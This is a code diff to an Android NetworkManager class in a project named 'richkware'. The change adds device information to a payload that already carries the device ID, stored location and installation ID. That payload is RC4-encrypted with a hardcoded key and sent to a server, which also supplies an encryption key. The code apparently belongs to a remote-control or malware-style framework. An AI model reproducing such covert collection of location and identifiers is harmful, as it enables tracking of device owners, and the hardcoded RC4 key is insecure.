@@ -19,7 +19,7 @@ import it.richkmeli.richkware.component.notification.NotificationManager;
 import it.richkmeli.richkware.component.notification.NotificationType;
 import it.richkmeli.richkware.storage.StorageKey;
 import it.richkmeli.richkware.storage.StorageManager;
-import it.richkmeli.richkware.system.device.DeviceInfo;
+import it.richkmeli.richkware.system.device.Device;
 import it.richkmeli.richkware.util.Logger;
 
 import static android.content.Context.CONNECTIVITY_SERVICE;
@@ -37,13 +37,14 @@ public class NetworkManager {
 
             JSONObject payload = new JSONObject();
             // device ID
-            payload.put("data0", RC4.encrypt(DeviceInfo.getDeviceID(context), "richktest"));
+            payload.put("data0", RC4.encrypt(Device.getDeviceID(context), "richktest"));
             // data
             JSONObject dataPayload = new JSONObject();
             dataPayload.put("serverPort", "none");
-            dataPayload.put("associatedUser", "richk@i.it");
+            dataPayload.put("associatedUser", "richk3@i.it");
             dataPayload.put("location", StorageManager.read(context, StorageKey.LOCATION));
             dataPayload.put("installationId", StorageManager.read(context, StorageKey.INSTALLATION_ID));
+            dataPayload.put("deviceInfo", Device.getDeviceInfo());
             payload.put("data", RC4.encrypt(dataPayload.toString(), "richktest"));
             // channel
             payload.put("channel", "richkware");
@@ -78,7 +79,7 @@ public class NetworkManager {
 
             JSONObject payload = new JSONObject();
             // device ID
-            payload.put("id", RC4.encrypt(DeviceInfo.getDeviceID(context), "richktest"));
+            payload.put("id", RC4.encrypt(Device.getDeviceID(context), "richktest"));
             payload.put("channel", "richkware");
 
             network.getRequest("encryptionKey", payload.toString(), "", null, new NetworkCallback() {
